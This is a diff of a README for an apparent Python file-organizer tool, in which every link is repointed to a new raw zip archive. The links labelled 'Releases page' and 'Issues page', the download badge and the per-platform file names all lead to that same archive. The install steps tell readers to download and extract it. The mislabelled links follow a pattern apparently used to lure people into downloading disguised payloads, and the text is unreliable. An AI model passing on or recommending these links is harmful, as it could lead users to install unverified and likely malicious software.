@@ -1,7 +1,7 @@
 # 🗂️ python-file-organizer-automation - Automate Your File Organization Easily
 
 ## 📥 Download the Latest Version
-[![Download Now](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip%20Now-v1.0.0-brightgreen)](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip)
+[![Download Now](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip%20Now-v1.0.0-brightgreen)](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the python-file-organizer-automation project! This application helps you organize your files into subfolders based on their type. Whether you have images, documents, videos, or audio files, this tool streamlines your file management process and enhances your productivity.
@@ -14,10 +14,10 @@ Before you start, ensure your system meets these requirements:
 - Storage: Minimum of 100 MB available space
 
 ## 💾 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip) to download the latest version.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip) to download the latest version.
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip).
-2. Find the latest release file (it may be named something like `https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip` for Windows or `https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip` for macOS/Linux).
+1. Visit the [Releases page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip).
+2. Find the latest release file (it may be named something like `https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip` for Windows or `https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip` for macOS/Linux).
 3. Click the link to download the file.
 4. Once downloaded, locate the file in your Downloads folder.
 5. If you downloaded a `.zip` file, extract it using your system's extraction tool.
@@ -73,7 +73,7 @@ This project focuses on automation, file cleanup, and management. You can explor
 - productivity-tools
 
 ## 🔗 Useful Links
-- [Releases page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip)
-- [Issues page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-file-organizer-automation.zip)
+- [Releases page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip)
+- [Issues page](https://raw.githubusercontent.com/monkey-luffy0/python-file-organizer-automation/main/subpartitioned/python-organizer-file-automation-v1.5.zip)
 
 Thank you for using python-file-organizer-automation! Enjoy a cleaner and more organized digital workspace.
